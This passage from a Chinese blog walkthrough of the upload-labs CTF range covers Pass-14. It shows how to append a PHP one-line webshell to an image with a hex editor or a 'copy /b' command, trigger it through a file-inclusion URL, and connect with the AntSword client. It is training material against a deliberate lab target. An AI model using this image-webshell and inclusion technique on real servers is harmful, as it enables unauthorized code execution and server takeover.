编码的文本打开。当然这对文件不会造成太大影响，但是重点在于，当你保存文件时，记事本不会保留特殊字符，也就是说，无论你是否对内容进行操作，记事本都会以 <code>ANSI</code> 的标准修改数据。例如替换映射特殊/未定义/禁止字符的字节，因为它们对于有效的 <code>ANSI</code> 文本没有意义，或者将空字符、行尾和文件序列结尾重新编码为 Windows / DOS 约定（如 Windows 系统中行尾使用两个字符表示：<code>CRLF</code> ，即回车和换行）。关于 <code>ANSI</code> 的更多讨论可以 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/701882/what-is-ansi-format">参考这里</a> ，我们只需意识到，使用记事本对图片进行修改是绝对不可取的，即使你不做修改。</p></li><li><p>我们可以使用 <code>NotePad++</code> 或者 <code>UltraEdit</code> 等可以完成十六进制编辑的编辑器进行修改，只要保持文件头，我们可以在任意位置插入木马：</p><img src="https://bu.dusays.com/2022/05/15/6280fa467f3ce.webp" alt="" style="zoom:75%"></li><li><p>不过还有一种更加优雅的方式，就是在命令行中使用 <code>copy</code> 命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy [图片文件名] /b + [木马文件名] /a [合成后的文件名]</span><br></pre></td></tr></table></figure><p><code>/b</code> 意为使用二进制打开文件，<code>/a</code> 意为使用文本方式打开文件，因此上述指令的意思就是，打开二进制流图片并在后方接入木马文本内容，合成的文件以最后的参数作为文件名另存。</p><img src="https://bu.dusays.com/2022/05/15/6280fa477886e.webp" alt="" style="zoom:75%"><p>可以在编辑器中验证合成的结果：</p><img src="https://bu.dusays.com/2022/05/15/6280fa48321cf.webp" alt="" style="zoom:75%"></li><li><p>上传修改后的图片文件，成功！</p><img src="https://bu.dusays.com/2022/05/15/6280fa44f223b.webp" alt="" style="zoom:75%"></li></ul></li></ul><h3 id="夺旗-13">夺旗</h3><ul><li><p>经上文分析，将构造好的文件上传至服务器后，在含有文件包含漏洞的页面 URL 后添加 <code>?file=[文件路径]</code> 即可，点开题目中的漏洞链接即可值得漏洞文件所在的地址，即在网页根目录处：</p><p><img src="https://bu.dusays.com/2022/05/15/6280fa2a23406.webp" alt="" style="zoom:25%"> <img src="https://bu.dusays.com/2022/05/15/6280fa2e18d8e.webp" alt="" style="zoom:25%"></p><p>为了直观验证木马执行情况，我们在一句话木马代码中预留了 <code>phpinfo()</code> ，因此直接打开页面即可观察到：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2b48707.webp" alt="" style="zoom:75%"><p>显示了 PHP 的信息，因此木马成功被包含并执行了！</p></li><li><p>那么接下来就是蚁剑连接了，值得注意的是，我们的链接应该指向代码作用之处。之前的关卡由于代码直接就执行了，因此连接到文件即可，而这一次代码是被包含到 <code>include.php</code> 之后才被执行的，因此应指向<strong>包含木马后</strong>的 <code>include.php</code> 文件，即：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机地址]/include.php?file=upload/[文件名]</span><br></pre></td></tr></table></figure></li><li><p>创建连接，显然是应该成功的。</p><img src="https://bu.dusays.com/2022/05/15/6280fa2ecb8da.webp" alt="" style="zoom:75%"></li><li><p>夺旗！连接成功了就行，想必本地目录也看累了，既然无旗可夺，不如看个视频放松一下。</p><iframe src="//player.bilibili.com/player.html?aid=768208334&bvid=BV1Ar4y1H7bk&cid=574525358&page=1&danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe></li></ul><h2 id="Pass-15">Pass-15</h2><h3 id="启动靶机-22">启动靶机</h3><h2 id="Pass-16">Pass-16</h2><h3 id="启动靶机-23">启动靶机</h3><h2 id="Pass-17">Pass-17</h2><h3 id="启动靶机-24">启动靶机</h3><h2 id="Pass-18">Pass-18</h2><h3 id="启动靶机-25">启动靶机</h3><h2 id="Pass-19">Pass-19</h2><h3 id="启动靶机-26">启动靶机</h3><h2 id="Pass-20">Pass-20</h2><h3 id="启动靶机-27">启动靶机</h3><h2 id="Pass-21">Pass-21</h2><h3 id="启动靶机-28">启动靶机</h3></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>upload-labs-完整训练</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://h-t-m.top/posts/ddd5444f/">https://h-t-m.top/posts/ddd5444f/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>h-t-m</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2022-05-04</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2022-05-16</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="https://pic.h-t-m.ltd/img/upload-labs.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/82963086/"><img class="prev-cover" src="https://pic.h-t-m.ltd/img/sort0.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">算法——初级排序</div></div></a></div><div class="next-post pull-right"><a href="/posts/d575d62b/"><img class="next-cover" src="https://pic.h-t-m.ltd/img/LeetCode.webp" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">LeetCode 刷题笔记——并查集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3989fe45/" title="BUUCTF 刷题笔记——day 5"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-21</div><div class="title">BUUCTF 刷题笔记——day 5</div></div></a></div><div><a href="/posts/3ee43a5c/" title="BUUCTF 刷题笔记——day 1"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-27</div><div class="title">BUUCTF 刷题笔记——day 1</div></div></a></div><div><a href="/posts/a7ed6be6/" title="BUUCTF 刷题笔记——day 2"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-28</div><div class="title">BUUCTF 刷题笔记——day 2</div></div></a></div><div><a href="/posts/d0ea5b70/" title="BUUCTF 刷题笔记——day 3"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-08</div><div class="title">BUUCTF 刷题笔记——day 3</div></div></a></div><div><a href="/posts/4e8eced3/" title="BUUCTF 刷题笔记——day 4"><img class="cover" src="https://pic.h-t-m.ltd/img/BUUCTF.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-05</div><div class="title">BUUCTF 刷题笔记——day 4</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/logo.jpg" onerror='this.onerror=null,this.src="https://bu.dusays.com/2022//01/05/8b98c9a603cef.gif"' alt="avatar"></div><div class="author-info__name">h-t-m</div><div class="author-info__description">个人博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">58</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h-t-m"><i class="fab fa-github"></i><span>找我玩~</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h-t-m/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1547563662@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/b3beff564d51a.png" target="_blank" title="微信"><i class="fab fa-weixin"></i></a><a class="social-icon" href="https://bu.dusays.com/2022/01/07/eaa1e2110d4a7.png" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我的博客开始更新啦！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">upload-labs-完整训练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-01"><span class="toc-number">1.1.</span> <span class="toc-text">Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-8"><span class="toc-number">1.1.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E9%A1%B5%E9%9D%A2-2"><span class="toc-number">1.1.2.</span> <span class="toc-text">研究页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-2"><span class="toc-number">1.1.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5-2"><span class="toc-number">1.1.4.</span> <span class="toc-text">入侵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-flag-2"><span class="toc-number">1.1.5.</span> <span class="toc-text">寻找 flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-02"><span class="toc-number">1.2.</span> <span class="toc-text">Pass-02</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-9"><span class="toc-number">1.2.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E9%A1%B5%E9%9D%A2-3"><span class="toc-number">1.2.2.</span> <span class="toc-text">研究页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97"><span class="toc-number">1.2.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-03"><span class="toc-number">1.3.</span> <span class="toc-text">Pass-03</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-10"><span class="toc-number">1.3.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2"><span class="toc-number">1.3.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-4"><span class="toc-number">1.3.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-04"><span class="toc-number">1.4.</span> <span class="toc-text">Pass-04</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-11"><span class="toc-number">1.4.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-5"><span class="toc-number">1.4.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-3"><span class="toc-number">1.4.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-05"><span class="toc-number">1.5.</span> <span class="toc-text">Pass-05</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-12"><span class="toc-number">1.5.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-6"><span class="toc-number">1.5.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-4"><span class="toc-number">1.5.4.</span> <span class="toc-text">夺旗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E6%8E%A2%E7%A9%B6"><span class="toc-number">1.5.5.</span> <span class="toc-text">问题探究</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E7%AA%81%E7%A0%B4"><span class="toc-number">1.5.6.</span> <span class="toc-text">再次突破</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-06"><span class="toc-number">1.6.</span> <span class="toc-text">Pass-06</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-13"><span class="toc-number">1.6.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-7"><span class="toc-number">1.6.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-5"><span class="toc-number">1.6.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-07"><span class="toc-number">1.7.</span> <span class="toc-text">Pass-07</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-14"><span class="toc-number">1.7.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-8"><span class="toc-number">1.7.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-6"><span class="toc-number">1.7.4.</span> <span class="toc-text">夺旗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E6%8E%A2%E7%A9%B6-2"><span class="toc-number">1.7.5.</span> <span class="toc-text">问题探究</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%A4%BA%E6%97%97"><span class="toc-number">1.7.6.</span> <span class="toc-text">再次夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-08"><span class="toc-number">1.8.</span> <span class="toc-text">Pass-08</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-15"><span class="toc-number">1.8.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-6"><span class="toc-number">1.8.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-9"><span class="toc-number">1.8.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-7"><span class="toc-number">1.8.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-09"><span class="toc-number">1.9.</span> <span class="toc-text">Pass-09</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-16"><span class="toc-number">1.9.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-7"><span class="toc-number">1.9.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-10"><span class="toc-number">1.9.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-8"><span class="toc-number">1.9.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-10"><span class="toc-number">1.10.</span> <span class="toc-text">Pass-10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-17"><span class="toc-number">1.10.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E9%A1%B5%E9%9D%A2-4"><span class="toc-number">1.10.2.</span> <span class="toc-text">研究页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-11"><span class="toc-number">1.10.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-9"><span class="toc-number">1.10.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-11"><span class="toc-number">1.11.</span> <span class="toc-text">Pass-11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-18"><span class="toc-number">1.11.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%95%8C%E9%9D%A2-8"><span class="toc-number">1.11.2.</span> <span class="toc-text">研究界面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-12"><span class="toc-number">1.11.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-10"><span class="toc-number">1.11.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-12"><span class="toc-number">1.12.</span> <span class="toc-text">Pass-12</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-19"><span class="toc-number">1.12.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E9%A1%B5%E9%9D%A2-5"><span class="toc-number">1.12.2.</span> <span class="toc-text">研究页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-13"><span class="toc-number">1.12.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-11"><span class="toc-number">1.12.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-13"><span class="toc-number">1.13.</span> <span class="toc-text">Pass-13</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-20"><span class="toc-number">1.13.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E9%A1%B5%E9%9D%A2-6"><span class="toc-number">1.13.2.</span> <span class="toc-text">研究页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-14"><span class="toc-number">1.13.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-12"><span class="toc-number">1.13.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-14"><span class="toc-number">1.14.</span> <span class="toc-text">Pass-14</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-21"><span class="toc-number">1.14.1.</span> <span class="toc-text">启动靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E9%A1%B5%E9%9D%A2-7"><span class="toc-number">1.14.2.</span> <span class="toc-text">研究页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6-15"><span class="toc-number">1.14.3.</span> <span class="toc-text">突破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%BA%E6%97%97-13"><span class="toc-number">1.14.4.</span> <span class="toc-text">夺旗</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-15"><span class="toc-number">1.15.</span> <span class="toc-text">Pass-15</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-22"><span class="toc-number">1.15.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-16"><span class="toc-number">1.16.</span> <span class="toc-text">Pass-16</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-23"><span class="toc-number">1.16.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-17"><span class="toc-number">1.17.</span> <span class="toc-text">Pass-17</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-24"><span class="toc-number">1.17.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-18"><span class="toc-number">1.18.</span> <span class="toc-text">Pass-18</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-25"><span class="toc-number">1.18.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-19"><span class="toc-number">1.19.</span> <span class="toc-text">Pass-19</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-26"><span class="toc-number">1.19.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-20"><span class="toc-number">1.20.</span> <span class="toc-text">Pass-20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-27"><span class="toc-number">1.20.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pass-21"><span class="toc-number">1.21.</span> <span class="toc-text">Pass-21</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%9D%B6%E6%9C%BA-28"><span class="toc-number">1.21.1.</span> <span class="toc-text">启动靶机</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/82963086/" title="算法——初级排序"><img src="https://pic.h-t-m.ltd/img/sort0.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="算法——初级排序"></a><div class="content"><a class="title" href="/posts/82963086/" title="算法——初级排序">算法——初级排序</a><time datetime="2022-05-09T15:05:27.000Z" title="发表于 2022-05-09 23:05:27">2022-05-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ddd5444f/" title="upload-labs-完整训练"><img src="https://pic.h-t-m.ltd/img/upload-labs.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="upload-labs-完整训练"></a><div class="content"><a class="title" href="/posts/ddd5444f/" title="upload-labs-完整训练">upload-labs-完整训练</a><time datetime="2022-05-04T14:02:10.000Z" title="发表于 2022-05-04 22:02:10">2022-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d575d62b/" title="LeetCode 刷题笔记——并查集"><img src="https://pic.h-t-m.ltd/img/LeetCode.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="LeetCode 刷题笔记——并查集"></a><div class="content"><a class="title" href="/posts/d575d62b/" title="LeetCode 刷题笔记——并查集">LeetCode 刷题笔记——并查集</a><time datetime="2022-05-03T11:13:41.000Z" title="发表于 2022-05-03 19:13:41">2022-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9cd54d6c/" title="算法——union-find"><img src="https://pic.h-t-m.ltd/img/union-find.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="算法——union-find"></a><div class="content"><a class="title" href="/posts/9cd54d6c/" title="算法——union-find">算法——union-find</a><time datetime="2022-04-27T15:18:45.000Z" title="发表于 2022-04-27 23:18:45">2022-04-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3989fe45/" title="BUUCTF 刷题笔记——day 5"><img src="https://pic.h-t-m.ltd/img/BUUCTF.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——day 5"></a><div class="content"><a class="title" href="/posts/3989fe45/" title="BUUCTF 刷题笔记——day 5">BUUCTF 刷题笔记——day 5</a><time datetime="2022-04-21T12:33:50.000Z" title="发表于 2022-04-21 20:33:50">2022-04-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright"><span>&copy;2020 - 2022<svg style="width:1.5em;height:1.5em" aria-hidden="true"><use xlink:href="#icon-Butterfly"></use></svg></span><span>h-t-m</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" 